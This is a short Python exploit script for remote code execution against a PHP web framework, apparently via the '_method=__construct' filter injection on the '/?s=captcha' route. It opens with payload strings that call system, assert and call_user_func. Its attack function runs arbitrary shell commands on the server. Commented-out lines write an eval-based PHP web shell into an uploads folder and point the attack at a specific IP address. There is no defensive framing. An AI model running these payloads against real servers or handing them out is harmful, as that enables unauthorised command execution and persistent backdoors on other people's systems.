"""
_method=__construct&filter[]=assert&server[]=phpinfo&get[]=phpinfo
or
_method=__construct&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo

_method=__construct&filter[]=system&method=GET&get[]=whoami
"""
import requests
import re


class Exploit:

    def attack(self, url):

        # _input = input(">>> ")
        r = requests.post(
            url + "/?s=captcha", data={
                "_method": "__construct",
                "filter[]": "system",
                "method": "GET",
                "get[]": "$_POST[c]",
                # "c": 'echo "<?php @eval($_POST[c]);?>" > Uploads/1.php'
                # "c": _input
                "c": "echo 111;"
            },
            verify=False
        )
        # print(r.text)
        m = re.search(r'<div class="echo">(.*?)</div>', r.text, re.S)
        if m:
            print(m.group(1))


# while True:
#     Exploit().attack("https://47.96.106.44/")
